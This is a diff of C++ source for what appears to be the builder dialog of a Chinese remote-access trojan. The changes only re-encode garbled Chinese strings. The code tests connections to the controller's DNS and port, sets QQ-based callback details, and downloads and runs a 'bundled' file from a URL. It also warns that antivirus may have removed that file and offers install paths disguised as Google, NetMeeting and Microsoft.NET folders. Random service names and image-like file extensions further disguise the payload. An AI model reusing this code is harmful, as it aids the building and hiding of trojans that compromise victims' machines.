@@ -973,10 +973,10 @@ fail:
 	}
 	else
 	{
-		strResult = "Á¬½ÓÊ§°Ü...(µ«ÊÇ²»Ò»¶¨Á¬²»ÉÏ£¬³é·ç°É£¬×ÜÖ®ÔËĞĞĞ¡Âí²âÊÔ£¬È·¶¨ÄãQQÃ»´í)";
+		strResult = "è¿æ¥å¤±è´¥...(ä½†æ˜¯ä¸ä¸€å®šè¿ä¸ä¸Šï¼ŒæŠ½é£å§ï¼Œæ€»ä¹‹è¿è¡Œå°é©¬æµ‹è¯•ï¼Œç¡®å®šä½ QQæ²¡é”™)";
 	}
 	
-	MessageBox(strResult,"ÌáÊ¾",MB_ICONSTOP);	
+	MessageBox(strResult,"æç¤º",MB_ICONSTOP);	
 	return;
 }
 
@@ -988,7 +988,7 @@ void CBuild::OnTestMaster2()
 
 	if (!m_dns2.GetLength()|| !m_port2)
 	{
-		MessageBox("ÇëÍêÕûÌîĞ´QQºÅÂë(2)ÉÏÏßĞÅÏ¢", "ÌáÊ¾", MB_ICONSTOP);
+		MessageBox("è¯·å®Œæ•´å¡«å†™QQå·ç (2)ä¸Šçº¿ä¿¡æ¯", "æç¤º", MB_ICONSTOP);
 		return;
 	}
 
@@ -1002,7 +1002,7 @@ void CBuild::TestMaster()
 	// TODO: Add your control notification handler code here
 //	BuildServer	*pThis = (BuildServer *)lparam;
 	CString	strResult;
-	CString	strResulr = "Á¬½ÓÊ§°Ü";
+	CString	strResulr = "è¿æ¥å¤±è´¥";
 	bool	bRet = true;
 	WSADATA	wsaData0;
 	WSAStartup(0x0201, &wsaData0);
@@ -1010,11 +1010,11 @@ void CBuild::TestMaster()
 	SOCKET	sRemote = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 	if (sRemote == SOCKET_ERROR)
 	{ 
-		MessageBox("ÓòÃûIPÉÏÏß-³õÊ¼»¯Ê§°Ü", "ÌáÊ¾", MB_ICONSTOP);
+		MessageBox("åŸŸåIPä¸Šçº¿-åˆå§‹åŒ–å¤±è´¥", "æç¤º", MB_ICONSTOP);
 		WSACleanup();
 		return ;
 	}
-	// ÉèÖÃsocketÎª·Ç×èÈû
+	// è®¾ç½®socketä¸ºéé˜»å¡
 	u_long argp	= 1;
 	ioctlsocket(sRemote, FIONBIO, &argp);
 	
@@ -1030,7 +1030,7 @@ void CBuild::TestMaster()
 		goto fail;
 	}
 	
-	// ¹¹Ôìsockaddr_in½á¹¹
+	// æ„é€ sockaddr_inç»“æ„
 	sockaddr_in	ClientAddr;
 	memset(&ClientAddr,0,sizeof(ClientAddr)); 
 	ClientAddr.sin_family	= AF_INET;
@@ -1054,17 +1054,17 @@ fail:
 	closesocket(sRemote);
 	WSACleanup();
 	
-	strResult.Format("ÓòÃûIPÉÏÏßĞÅÏ¢£º\nÓòÃû IP£º%s\nÁ¬½Ó¶Ë¿Ú£º%d", m_dns1, m_port1);
+	strResult.Format("åŸŸåIPä¸Šçº¿ä¿¡æ¯ï¼š\nåŸŸå IPï¼š%s\nè¿æ¥ç«¯å£ï¼š%d", m_dns1, m_port1);
 	if (bRet)
 	{
-		strResulr = "Á¬½Ó³É¹¦";
+		strResulr = "è¿æ¥æˆåŠŸ";
 		MessageBox(strResult,strResulr,MB_ICONINFORMATION);
 	}
     else
 	{
 		MessageBox(strResult,strResulr,MB_ICONSTOP);
 	}
-	m_testBtn.EnableWindow(true); //µÈ´ı²âÊÔÍê³ÉµÄÊ±ºò²Å¼¤»î°´Å¥£¬±ÜÃâ¶à´Îµã»÷¿¨ËÀµÄÏÖÏó
+	m_testBtn.EnableWindow(true); //ç­‰å¾…æµ‹è¯•å®Œæˆçš„æ—¶å€™æ‰æ¿€æ´»æŒ‰é’®ï¼Œé¿å…å¤šæ¬¡ç‚¹å‡»å¡æ­»çš„ç°è±¡
 	
 	return ;
 }
@@ -1074,7 +1074,7 @@ void CBuild::TestMaster2()
 	// TODO: Add your control notification handler code here
 //	BuildServer	*pThis = (BuildServer *)lparam;
 	CString	strResult;
-	CString	strResulr = "Á¬½ÓÊ§°Ü";
+	CString	strResulr = "è¿æ¥å¤±è´¥";
 	bool	bRet = true;
 	WSADATA	wsaData0;
 	WSAStartup(0x0201, &wsaData0);
@@ -1082,11 +1082,11 @@ void CBuild::TestMaster2()
 	SOCKET	sRemote = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 	if (sRemote == SOCKET_ERROR)
 	{ 
-		MessageBox("QQÉÏÏß(2)ÉÏÏß-³õÊ¼»¯Ê§°Ü", "ÌáÊ¾", MB_ICONSTOP);
+		MessageBox("QQä¸Šçº¿(2)ä¸Šçº¿-åˆå§‹åŒ–å¤±è´¥", "æç¤º", MB_ICONSTOP);
 		WSACleanup();
 		return ;
 	}
-	// ÉèÖÃsocketÎª·Ç×èÈû
+	// è®¾ç½®socketä¸ºéé˜»å¡
 	u_long argp	= 1;
 	ioctlsocket(sRemote, FIONBIO, &argp);
 	
@@ -1103,7 +1103,7 @@ void CBuild::TestMaster2()
 		goto fail;
 	}
 	
-	// ¹¹Ôìsockaddr_in½á¹¹
+	// æ„é€ sockaddr_inç»“æ„
 	sockaddr_in	ClientAddr;
 	memset(&ClientAddr,0,sizeof(ClientAddr)); 
 	ClientAddr.sin_family	= AF_INET;
@@ -1127,12 +1127,12 @@ fail:
 	closesocket(sRemote);
 	WSACleanup();
 	
-	strResult.Format("QQÉÏÏß(2)Á¬½ÓĞÅÏ¢£º\nÓòÃû IP£º%s\nÁ¬½Ó¶Ë¿Ú£º%d", m_dns2, m_port2);
+	strResult.Format("QQä¸Šçº¿(2)è¿æ¥ä¿¡æ¯ï¼š\nåŸŸå IPï¼š%s\nè¿æ¥ç«¯å£ï¼š%d", m_dns2, m_port2);
 	if (bRet)
-		strResulr = "Á¬½Ó³É¹¦";
+		strResulr = "è¿æ¥æˆåŠŸ";
 	
 	MessageBox(strResult,strResulr,MB_ICONINFORMATION);
-	m_testBtn2.EnableWindow(true);//µÈ´ı²âÊÔÍê³ÉµÄÊ±ºò²Å¼¤»î°´Å¥£¬±ÜÃâ¶à´Îµã»÷¿¨ËÀµÄÏÖÏó
+	m_testBtn2.EnableWindow(true);//ç­‰å¾…æµ‹è¯•å®Œæˆçš„æ—¶å€™æ‰æ¿€æ´»æŒ‰é’®ï¼Œé¿å…å¤šæ¬¡ç‚¹å‡»å¡æ­»çš„ç°è±¡
 	
 	return ;
 }
@@ -1147,7 +1147,7 @@ void CBuild::OnIPjm()
 	unsigned char m_strData[256];
 	strcpy((char *)m_strData,ps);
 	Encrypt((char *)m_strData,strlen((const char *)m_strData));
-	SetDlgItemText(IDC_LONGPASS2,(const char *)m_strData);   //ÎÄ¼şÃû
+	SetDlgItemText(IDC_LONGPASS2,(const char *)m_strData);   //æ–‡ä»¶å
 }
 
 void CBuild::OnSjfz() 
@@ -1156,7 +1156,7 @@ void CBuild::OnSjfz()
 	UpdateData(TRUE);
 	CString strText1 = m_Sjfz;
 	
-	//½«ÄÚÈİ±£´æµ½¼ôÌù°å¡£
+	//å°†å†…å®¹ä¿å­˜åˆ°å‰ªè´´æ¿ã€‚
 	if (!strText1.IsEmpty())
 	{
 		if (OpenClipboard())
@@ -1172,7 +1172,7 @@ void CBuild::OnSjfz()
 			}
 			CloseClipboard();
 		}
-		MessageBox("¸´ÖÆ³É¹¦!","ÌáÊ¾", MB_ICONINFORMATION);
+		MessageBox("å¤åˆ¶æˆåŠŸ!","æç¤º", MB_ICONINFORMATION);
 	}	
 }
 
@@ -1204,7 +1204,7 @@ CString GetExePath()
 {
 	char pathbuf[260];
 	int  pathlen = ::GetModuleFileName(NULL,pathbuf,MAX_PATH);
-	// Ìæ»»µôµ¥¸Ü
+	// æ›¿æ¢æ‰å•æ 
 	while(TRUE)
 	{
 		if(pathbuf[pathlen--]=='\\')
@@ -1249,13 +1249,13 @@ void CBuild::OnFtpIp()
 	CBuild sty;
 	CString Gip;
 	
-	m_Ftp_ip.EnableWindow(FALSE);  //½ûÓÃ°´¼ü
+	m_Ftp_ip.EnableWindow(FALSE);  //ç¦ç”¨æŒ‰é”®
 	Gip=sty.GetIPAddress();
 	SetDlgItemText(IDC_LONGIP2,Gip);
-	m_Ftp_ip.EnableWindow(TRUE);   //»Ö¸´°´¼ü
+	m_Ftp_ip.EnableWindow(TRUE);   //æ¢å¤æŒ‰é”®
 }
 
-//Ëæ»úº¯Êı
+//éšæœºå‡½æ•°
 int StormRand(int count)
 {
 	unsigned long Time=GetTickCount();
@@ -1358,7 +1358,7 @@ void CBuild::OnRandom2()
 	}
 
 	CString	WJ_Name=szTemp;
-	SetDlgItemText(IDC_DLL_NAME,WJ_Name+".exe");   //ÎÄ¼şÃû
+	SetDlgItemText(IDC_DLL_NAME,WJ_Name+".exe");   //æ–‡ä»¶å
 
 	SetDlgItemText(IDC_EDIT_SVCNAME,ServerName);
 	SetDlgItemText(IDC_EDIT_SCNAME,ServerShow);
@@ -1367,7 +1367,7 @@ void CBuild::OnRandom2()
 
 void CBuild::OnBtnPath() 
 {
-	MessageBox("ÎÄ¼ş°²×°µ½µÄÂ·¾¶£¬ÁĞ±íÖĞµÄÂ·¾¶Îª£º\n1. %SystemRoot%\\system32\\,¼´C:\\WINDOWS\\system32\\\n2. %ProgramFiles%\\StormII\\,¼´C:\\Program Files\\StormII\\\n3. %ALLUSERSPROFILE%\\Application Data\\Storm\\update\\,¼´C:\\Documents and Settings\\All Users\\Application Data\\Storm\\update\\\n4. %ProgramFiles%\\Google\\,¼´C:\\Program Files\\Google\\\n5. %ProgramFiles%\\NetMeeting\\,¼´C:\\Program Files\\NetMeeting\\\n6. %ALLUSERSPROFILE%\\Application Data\\DRM\\,¼´C:\\Documents and Settings\\All Users\\Application Data\\DRM\\\n7. %ProgramFiles%\\AppPatch\\,¼´C:\\Program Files\\AppPatch\\\n8. %ALLUSERSPROFILE%\\Application Data\\Microsoft.NET\\,¼´C:\\Documents and Settings\\All Users\\Application Data\\Microsoft.NET\\\n¿É×Ô¼º¸ü¸Ä×Ô¶¨ÒåÂ·¾¶£¬¿ÉÔÚÆäÖĞ°üº¬»·¾³±äÁ¿£¬×î³¤100×Ö½Ú£¬\nÉè¶¨µÄÂ·¾¶²»´æÔÚ»á³¢ÊÔ´´½¨£¬´´½¨Ê§°Ü²»»áÉÏÏß!\n9.ÎÄ¼şÃû³ÆÖ§³Öjpg,png,pif,msc,bat,gif,exeµÈ!","°²×°Â·¾¶",MB_ICONINFORMATION);		
+	MessageBox("æ–‡ä»¶å®‰è£…åˆ°çš„è·¯å¾„ï¼Œåˆ—è¡¨ä¸­çš„è·¯å¾„ä¸ºï¼š\n1. %SystemRoot%\\system32\\,å³C:\\WINDOWS\\system32\\\n2. %ProgramFiles%\\StormII\\,å³C:\\Program Files\\StormII\\\n3. %ALLUSERSPROFILE%\\Application Data\\Storm\\update\\,å³C:\\Documents and Settings\\All Users\\Application Data\\Storm\\update\\\n4. %ProgramFiles%\\Google\\,å³C:\\Program Files\\Google\\\n5. %ProgramFiles%\\NetMeeting\\,å³C:\\Program Files\\NetMeeting\\\n6. %ALLUSERSPROFILE%\\Application Data\\DRM\\,å³C:\\Documents and Settings\\All Users\\Application Data\\DRM\\\n7. %ProgramFiles%\\AppPatch\\,å³C:\\Program Files\\AppPatch\\\n8. %ALLUSERSPROFILE%\\Application Data\\Microsoft.NET\\,å³C:\\Documents and Settings\\All Users\\Application Data\\Microsoft.NET\\\nå¯è‡ªå·±æ›´æ”¹è‡ªå®šä¹‰è·¯å¾„ï¼Œå¯åœ¨å…¶ä¸­åŒ…å«ç¯å¢ƒå˜é‡ï¼Œæœ€é•¿100å­—èŠ‚ï¼Œ\nè®¾å®šçš„è·¯å¾„ä¸å­˜åœ¨ä¼šå°è¯•åˆ›å»ºï¼Œåˆ›å»ºå¤±è´¥ä¸ä¼šä¸Šçº¿!\n9.æ–‡ä»¶åç§°æ”¯æŒjpg,png,pif,msc,bat,gif,exeç­‰!","å®‰è£…è·¯å¾„",MB_ICONINFORMATION);		
 }
 
 HBRUSH CBuild::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor) 
@@ -1377,15 +1377,15 @@ HBRUSH CBuild::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor)
 	if (nCtrlID==IDC_EDIT_BUILDLOG && nCtlColor == CTLCOLOR_EDIT)
 	{
 		COLORREF clr = RGB(200, 200, 200);
-		pDC->SetTextColor(clr);   //ÉèÖÃ»ÒÉ«µÄÎÄ±¾
+		pDC->SetTextColor(clr);   //è®¾ç½®ç°è‰²çš„æ–‡æœ¬
 		clr = RGB(0, 0, 0);
-		pDC->SetBkColor(clr);     //ÉèÖÃºÚÉ«µÄ±³¾°
-		hbr = CreateSolidBrush(clr);  //×÷ÎªÔ¼¶¨£¬·µ»Ø±³¾°É«¶ÔÓ¦µÄË¢×Ó¾ä±ú
+		pDC->SetBkColor(clr);     //è®¾ç½®é»‘è‰²çš„èƒŒæ™¯
+		hbr = CreateSolidBrush(clr);  //ä½œä¸ºçº¦å®šï¼Œè¿”å›èƒŒæ™¯è‰²å¯¹åº”çš„åˆ·å­å¥æŸ„
 	}
 	else if ((nCtrlID==IDC_DNS || nCtrlID==IDC_PORT) && m_lanpenetrate)
 	{
 		COLORREF clr = RGB(255, 0, 0);
-		pDC->SetTextColor(clr);   //ÉèÖÃºìÉ«µÄÎÄ±¾
+		pDC->SetTextColor(clr);   //è®¾ç½®çº¢è‰²çš„æ–‡æœ¬
 	}
 	return hbr;
 }
@@ -1477,7 +1477,7 @@ void CBuild::OnKbTest()
 	
 	if (m_edit_kb.GetLength() == 0)
 	{
-		AfxMessageBox("ÎÄ¼şµØÖ·Îª¿Õ£¬ÇëÊäÈëÎÄ¼şÀ¦°óµØÖ·");
+		AfxMessageBox("æ–‡ä»¶åœ°å€ä¸ºç©ºï¼Œè¯·è¾“å…¥æ–‡ä»¶æ†ç»‘åœ°å€");
 		return ;
 	}
 	
@@ -1485,7 +1485,7 @@ void CBuild::OnKbTest()
 	lpFileName = strrchr(lpUrl, '/');
 	if (lpFileName == NULL)
 	{
-		AfxMessageBox("ÎŞ·¨»ñÈ¡ÎÄ¼şÀ¦°óµØÖ·ÖĞµÄÎÄ¼şÃû");
+		AfxMessageBox("æ— æ³•è·å–æ–‡ä»¶æ†ç»‘åœ°å€ä¸­çš„æ–‡ä»¶å");
 		return;
 	}
 	
@@ -1497,19 +1497,19 @@ void CBuild::OnKbTest()
 	{
 		if (!CheckFileExist(szFilePath))
 		{
-			AfxMessageBox("ÎÄ¼şÏÂÔØ³É¹¦£¬µ«ÊÇÎÄ¼ş²»´æÔÚ£¬ºÜ¿ÉÄÜ±»É±¶¾Èí¼ş²éÉ±»òÕßÎÄ¼şÃû³ö´í");
+			AfxMessageBox("æ–‡ä»¶ä¸‹è½½æˆåŠŸï¼Œä½†æ˜¯æ–‡ä»¶ä¸å­˜åœ¨ï¼Œå¾ˆå¯èƒ½è¢«æ€æ¯’è½¯ä»¶æŸ¥æ€æˆ–è€…æ–‡ä»¶åå‡ºé”™");
 			return ; 
 		}
 	}
 	else if (hr == INET_E_DOWNLOAD_FAILURE) 
 	{
-		AfxMessageBox("URLµØÖ·²»ÕıÈ·£¬ÎÄ¼şÏÂÔØÊ§°Ü");
-		return ; //URLµØÖ·²»ÕıÈ·£¬ÎÄ¼şÏÂÔØÊ§°Ü
+		AfxMessageBox("URLåœ°å€ä¸æ­£ç¡®ï¼Œæ–‡ä»¶ä¸‹è½½å¤±è´¥");
+		return ; //URLåœ°å€ä¸æ­£ç¡®ï¼Œæ–‡ä»¶ä¸‹è½½å¤±è´¥
 	}
 	else
 	{
-		AfxMessageBox("ÎÄ¼şÏÂÔØÊ§°Ü£¬Çë¼ì²éURLÊÇ·ñÕıÈ·");
-		return ; //ÎÄ¼şÏÂÔØÊ§°Ü£¬Çë¼ì²éURLÊÇ·ñÕıÈ·
+		AfxMessageBox("æ–‡ä»¶ä¸‹è½½å¤±è´¥ï¼Œè¯·æ£€æŸ¥URLæ˜¯å¦æ­£ç¡®");
+		return ; //æ–‡ä»¶ä¸‹è½½å¤±è´¥ï¼Œè¯·æ£€æŸ¥URLæ˜¯å¦æ­£ç¡®
 	}
 	OpenFile1(szFilePath, SW_SHOW);
 	//ShellExecute(NULL, "open", szFilePath, NULL, NULL, SW_SHOW);
@@ -1524,9 +1524,9 @@ BOOL CBuild::PreTranslateMessage(MSG* pMsg)
 		GetDlgItem(IDC_DNS)->Invalidate(FALSE);
 		GetDlgItem(IDC_PORT)->Invalidate(FALSE);
 // 		if (m_lanpenetrate)
-// 			MessageBox("ÒÑÆôÓÃÄÚÍø´©Í¸Ä£Ê½!", "ÌáÊ¾", MB_ICONINFORMATION);
+// 			MessageBox("å·²å¯ç”¨å†…ç½‘ç©¿é€æ¨¡å¼!", "æç¤º", MB_ICONINFORMATION);
 // 		else
-// 			MessageBox("ÒÑ½ûÓÃÄÚÍø´©Í¸Ä£Ê½!", "ÌáÊ¾", MB_ICONINFORMATION);
+// 			MessageBox("å·²ç¦ç”¨å†…ç½‘ç©¿é€æ¨¡å¼!", "æç¤º", MB_ICONINFORMATION);
 	}
 	return CDialog::PreTranslateMessage(pMsg);
 }
